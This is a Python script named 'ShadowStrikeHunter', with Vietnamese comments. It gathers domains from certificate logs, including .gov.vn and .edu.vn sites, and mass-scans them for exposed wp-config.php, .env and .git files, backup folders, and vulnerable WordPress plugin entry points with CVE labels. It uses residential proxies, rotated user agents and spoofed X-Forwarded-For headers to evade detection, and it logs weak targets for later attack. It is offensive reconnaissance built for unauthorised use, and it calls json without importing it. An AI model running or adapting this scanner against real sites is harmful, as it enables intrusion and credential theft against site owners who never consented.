import requests
import re
import concurrent.futures
import urllib3
import random
import os
import sys
import time
from threading import Lock, Semaphore
import idna  # Để decode Punycode domain

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

R, G, Y, B, C, P, W = '\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[96m', '\033[95m', '\033[0m'
BOLD, UNDER = '\033[1m', '\033[4m'

class ShadowStrikeHunter:
    def __init__(self):
        self.output = 'SHADOW_STRIKE_2026.txt'
        self.weak_domains_file = 'WEAK_DOMAINS.txt'
        self.vuln_report_json = 'VULN_REPORT_2026.json'
        self.targets = set()
        self.processed = 0
        self.found_count = 0
        self.lock = Lock()
        self.semaphore = Semaphore(15)  # Giới hạn 15 concurrent request

        # PROXY & UA
        self.proxies = []  # ← DÁN RESIDENTIAL PROXY VÀO ĐÂY
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
            'Mozilla/5.0 (Android 14; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
        ]

        # ENDPOINTS NÂNG CẤP - Thêm vuln entrypoint hot 2026 (RCE, Upload, SQLi)
        self.critical_endpoints = [
            # Core leak
            ('/wp-config.php', 'DB_CONFIG_LEAK'),
            ('/.env', 'ENV_LEAK'),
            ('/wp-config.bak', 'CONFIG_BAK'),
            ('/wp-config.php.bak', 'CONFIG_PHP_BAK'),
            ('/wp-config.old', 'OLD_CONFIG'),
            ('/wp-content/debug.log', 'DEBUG_LOG'),
            # Git
            ('/.git/config', 'GIT_CONFIG'),
            ('/.git/HEAD', 'GIT_HEAD'),
            # WP Core
            ('/wp-json/wp/v2/users', 'USER_ENUM'),
            ('/xmlrpc.php', 'XMLRPC_BRUTE'),
            # Backup hot
            ('/wp-content/ai1wm-backups/', 'AI1WM_BACKUP'),
            ('/wp-content/updraft/', 'UPDRAFT_BACKUP'),
            ('/wp-content/uploads/duplicator-backups/', 'DUPLICATOR_BACKUP'),
            ('/wp-content/uploads/wpvivid-backup/', 'WPVIVID_BACKUP'),
            ('/wp-content/backups-dup-lite/', 'DUPLICATOR_LITE'),
            ('/wp-content/uploads/backupbuddy-backups/', 'BACKUPBUDDY'),
            ('/backup/', 'ROOT_BACKUP_DIR'),
            # Plugin vuln entrypoint hot 2026
            ('/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php', 'FM_RCE'),
            ('/wp-content/plugins/backup-backup/includes/backup-heart.php', 'BACKUP_RCE'),
            ('/wp-content/plugins/multi-uploader/upload.php', 'MULTIUPLOADER_RCE'),
            ('/wp-admin/admin-ajax.php?action=aiengine_upload', 'AI_ENGINE_RCE'),  # CVE-2025-xxxx
            ('/wp-admin/admin-ajax.php?action=revslider_show_image', 'REVSIDER_RCE'),  # Old but still hit in VN
            ('/wp-content/plugins/contact-form-7/includes/submissions.php', 'CF7_SQLI_ENTRY'),  # Potential SQLi if old
            ('/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.js', 'WOO_ENTRY'),  # Check for old Woo
            ('/wp-admin/admin-ajax.php?action=elementor_ajax', 'ELEMENTOR_RCE_ENTRY'),  # RCE if old
        ]

        # Plugin phổ biến dễ vuln ở VN - mở rộng + vuln check chi tiết
        self.vuln_plugins = {
            'elementor': {'old': ['<3.25.0'], 'desc': 'Unauth RCE/Upload/File Inclusion CVE-2023-48777/2022-1329'},
            'contact-form-7': {'old': ['<5.9.0'], 'desc': 'Stored XSS/SQLi/Open Redirect CVE-2020-35489/2025-3247'},
            'woocommerce': {'old': ['<9.5.0'], 'desc': 'Multiple SQLi/XSS/Priv Esc CVE-2025-xxxx'},
            'wp-file-manager': {'old': ['<7.2.0'], 'desc': 'Unauth RCE/File Upload CVE-2020-25213'},
            'wp-ulike': {'old': ['<4.6.9'], 'desc': 'Stored XSS/SQLi/Race Condition CVE-2023-3044'},
            'revslider': {'old': ['<6.6.0'], 'desc': 'SQLi/File Inclusion/RCE CVE-2015-1579'},
            'ninja-forms': {'old': ['<3.6.0'], 'desc': 'Stored XSS/CSV Injection CVE-2023-37979'},
            'td-composer': {'old': ['<2.0'], 'desc': 'Stored XSS/CSRF CVE-2023-3169'},
            'wpforms-lite': {'old': ['<1.8.0'], 'desc': 'Unauth Stored XSS CVE-2023-37979'},
            'ai-engine': {'old': ['<1.0'], 'desc': 'Unauth Upload/RCE CVE-2025-7847'},
            'updraftplus': {'old': ['<1.23.0'], 'desc': 'Backup Leak/Priv Esc CVE-2023-3630'},
        }

    def get_proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http": p, "https": p}

    def fetch_infinity_sources(self):
        kws = ['.gov.vn', '.edu.vn', 'wordpress', 'wp-content', 'portal', 'vn', 'thuvien', 'tintuc', 'blog', 'shop', 'hoidap']
        print(f"{B}[*] Đang thu thập mục tiêu đa nguồn...{W}")

        def get_crt(kw):
            for attempt in range(3):  # Retry 3 lần
                try:
                    r = requests.get(f"https://crt.sh/?q={kw}&output=json", timeout=30 + attempt*15)
                    if r.status_code == 200:
                        filtered = [i['name_value'].lower().replace('*.', '')
                                    for i in r.json()
                                    if len(i['name_value'].split('.')) <= 4 and len(i['name_value']) < 80]
                        # Lọc subdomain rác
                        bad_keywords = ['test', 'staging', 'dev', 'beta', 'cache', 'cdn', 'mail', 'api', 'forum']
                        return [d for d in filtered if not any(k in d for k in bad_keywords)]
                    time.sleep(3 * (attempt + 1))  # Backoff
                except Exception as e:
                    print(f"{Y}[!] Lỗi {kw} (lần {attempt+1}): {str(e)}{W}")
            return []

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(get_crt, kw) for kw in kws]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.targets.update(result)

        print(f"{G}[✅] Tổng kho mục tiêu: {len(self.targets):,} domain.{W}")

    def get_plugin_version(self, base_url, slug, headers, proxy):
        paths = [
            f"/wp-content/plugins/{slug}/readme.txt",
            f"/wp-content/plugins/{slug}/changelog.txt",
            f"/wp-content/plugins/{slug}/style.css"  # fallback nếu readme fail
        ]
        for path in paths:
            try:
                url = base_url.rstrip('/') + path
                r = requests.get(url, headers=headers, proxies=proxy, timeout=6, verify=False)
                if r.status_code == 200:
                    match = re.search(r'(?:Stable tag|Version):\s*([\d\.]+)', r.text, re.IGNORECASE)
                    return match.group(1) if match else "Unknown"
            except:
                continue
        return "N/A"

    def decode_domain(self, domain):
        try:
            return idna.decode(domain)
        except:
            return domain  # fallback nếu không decode được

    def audit(self, domain):
        decoded_domain = self.decode_domain(domain)  # Decode Punycode
        findings = []
        proxy = self.get_proxy()
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8']),
            'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        }

        base_url = None
        for proto in ['https', 'http']:
            url = f"{proto}://{domain}"
            try:
                time.sleep(random.uniform(1.5, 3.5))  # Tăng delay giữa domain
                r_main = requests.get(url, headers=headers, proxies=proxy, timeout=12, verify=False)
                text_lower = r_main.text.lower()
                is_wp = any(x in text_lower for x in ['wp-content', 'wp-includes', 'wp-json', 'wordpress'])
                status_tag = f"{P}[WP]{W}" if is_wp else f"{C}[NON-WP]{W}"

                with self.lock:
                    sys.stdout.write(f"\r{Y}[*] Testing: {status_tag} {decoded_domain[:30]}{W} " + " " * 20)
                    sys.stdout.flush()

                if is_wp:
                    base_url = url
                    # Check PHP version từ header
                    php_ver = r_main.headers.get('X-Powered-By', '')
                    if 'PHP/' in php_ver:
                        php_version = re.search(r'PHP/([\d\.]+)', php_ver).group(1) if re.search(r'PHP/([\d\.]+)', php_ver) else ''
                        if php_version and float(php_version[:3]) < 8.0:
                            findings.append(f"{R}[HIGH RISK] Outdated PHP v{php_version} - Multiple Vulns{W}")
                    # Check directory listing cho /wp-content/uploads/
                    uploads_url = base_url.rstrip('/') + '/wp-content/uploads/'
                    r_uploads = requests.get(uploads_url, headers=headers, proxies=proxy, timeout=7)
                    if r_uploads.status_code == 200 and ('Index of' in r_uploads.text or 'parent directory' in r_uploads.text):
                        findings.append(f"{Y}[DIR LIST] Exposed Uploads: {uploads_url}{W}")
                    break
            except:
                continue

        if not base_url:
            with self.lock:
                self.processed += 1
            return

        # Quét endpoint với semaphore
        for path, label in self.critical_endpoints:
            with self.semaphore:
                try:
                    time.sleep(random.uniform(0.4, 1.2))  # Delay giữa path
                    full_url = base_url.rstrip('/') + path
                    r = requests.get(full_url, headers=headers, proxies=proxy, timeout=7, verify=False, allow_redirects=False)
                    if r.status_code == 200 and len(r.content) > 50:
                        if any(ind in r.text for ind in ['DB_PASSWORD', '<?php', 'Index of', 'WPRESS', 'Stable tag']):
                            findings.append(f"{R}[CRITICAL] {label}: {full_url}{W}")
                except:
                    continue

        # Check plugin version
        plugin_slugs = set(re.findall(r'/wp-content/plugins/([^/\'"]+)/', r_main.text.lower()))
        if plugin_slugs:
            print(f"\n{Y}[PLUGIN] Detected on {decoded_domain}: {', '.join(list(plugin_slugs)[:6])}{W}")
            for slug in list(plugin_slugs)[:10]:  # Tăng giới hạn nhẹ
                ver = self.get_plugin_version(base_url, slug, headers, proxy)
                if ver != "N/A" and ver != "Unknown":
                    status = f"{P}[PLUGIN] {slug} v{ver}{W}"
                    if slug in self.vuln_plugins:
                        for old in self.vuln_plugins[slug]['old']:
                            if ver.startswith(tuple(old.split('.'))) or ver < old.lstrip('<'):
                                status = f"{R}[HIGH RISK] {slug} v{ver} - {self.vuln_plugins[slug]['desc']}{W}"
                                findings.append(status)
                    print(f" → {status}")

        # Báo cáo
        with self.lock:
            self.processed += 1
            if findings:
                self.found_count += 1
                print(f"\n{G}{BOLD}[🎯] SUCCESS #{self.found_count}: {decoded_domain}{W}")
                for f in findings:
                    print(f" |-- {f}")
                with open(self.output, 'a') as f:
                    clean = [re.sub(r'\033\[[0-9;]*m', '', i) for i in findings]
                    f.write(f"TARGET: {decoded_domain} (original: {domain})\n" + "\n".join(clean) + "\n\n")
                with open(self.weak_domains_file, 'a') as wf:
                    wf.write(f"{decoded_domain}\n")
                # Lưu JSON report
                with open(self.vuln_report_json, 'a') as jf:
                    jf.write(json.dumps({"domain": decoded_domain, "findings": clean}) + "\n")
                sys.stdout.write("\a")  # Beep

            perc = (self.processed / len(self.targets)) * 100 if self.targets else 0
            sys.stdout.write(f"\r{Y}[*] Progress: {self.processed}/{len(self.targets)} ({perc:.2f}%) | Ghosting: {decoded_domain[:25]}...{W}")
            sys.stdout.flush()

    def start(self, threads=50):
        self.fetch_infinity_sources()
        if not self.targets: return

        print(f"\n{B}{BOLD}[SHADOW STRIKE ACTIVATED] Threads: {threads} | Targets: {len(self.targets)}{W}\n")
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(self.audit, list(self.targets))

if __name__ == "__main__":
    try:
        ShadowStrikeHunter().start(threads=50)
    except KeyboardInterrupt:
        print(f"\n{R}[!] Dừng bởi người dùng.{W}")